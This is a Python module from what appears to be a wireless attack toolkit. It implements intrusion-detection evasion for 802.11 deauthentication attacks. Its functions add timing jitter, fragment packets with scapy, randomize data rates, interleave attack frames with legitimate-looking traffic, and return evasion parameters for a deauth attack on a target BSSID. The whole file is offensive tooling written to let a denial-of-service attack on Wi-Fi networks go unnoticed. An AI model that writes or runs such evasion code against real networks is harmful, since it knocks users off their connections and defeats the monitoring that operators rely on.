"""
IDS Evasion Techniques
======================
Packet fragmentation, timing jitter, protocol-compliant malformed packets.
"""

import random
import time
from typing import Dict, Any, Optional

try:
    from scapy.all import RadioTap, Dot11, Dot11Deauth, fragment, sendp
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

from rich.console import Console

console = Console()


class IDSEvasion:
    """Implements IDS/IPS evasion techniques."""

    def __init__(self, jitter_percent: float = 5.0):
        self.jitter_percent = jitter_percent

    def timing_jitter(self, base_delay: float) -> float:
        """Add random timing variation within normal variance."""
        jitter = base_delay * (self.jitter_percent / 100.0)
        return max(0.001, base_delay + random.uniform(-jitter, jitter))

    def fragment_packet(self, pkt, frag_size: int = 64) -> list:
        """Fragment a packet into smaller pieces."""
        if not SCAPY_AVAILABLE:
            return [pkt]
        try:
            frags = fragment(pkt, fragsize=frag_size)
            return frags
        except Exception:
            return [pkt]

    def randomize_rate(self, base_rate: int = 54) -> int:
        """Randomize data rate within normal range."""
        valid_rates = [1, 2, 5.5, 6, 9, 11, 12, 18, 24, 36, 48, 54]
        # Pick near the base rate
        closest = min(valid_rates, key=lambda x: abs(x - base_rate))
        idx = valid_rates.index(closest)
        jitter = random.randint(-1, 1)
        new_idx = max(0, min(len(valid_rates) - 1, idx + jitter))
        return valid_rates[new_idx]

    def interleave_legitimate(self, attack_pkts: list, legit_pkts: list, ratio: float = 0.3) -> list:
        """Mix attack packets with legitimate-looking traffic."""
        mixed = []
        legit_idx = 0
        for i, atk in enumerate(attack_pkts):
            mixed.append(atk)
            if random.random() < ratio and legit_idx < len(legit_pkts):
                mixed.append(legit_pkts[legit_idx])
                legit_idx += 1
        return mixed

    def apply_to_deauth(
        self,
        target_bssid: str,
        count: int,
        fragment: bool = False,
    ) -> Dict[str, Any]:
        """Get evasion parameters for a deauth attack."""
        base_delay = 0.1
        delays = [self.timing_jitter(base_delay) for _ in range(count)]
        rates = [self.randomize_rate() for _ in range(count)]
        return {
            "count": count,
            "delays": delays,
            "rates": rates,
            "fragment": fragment,
            "interleave": True,
        }
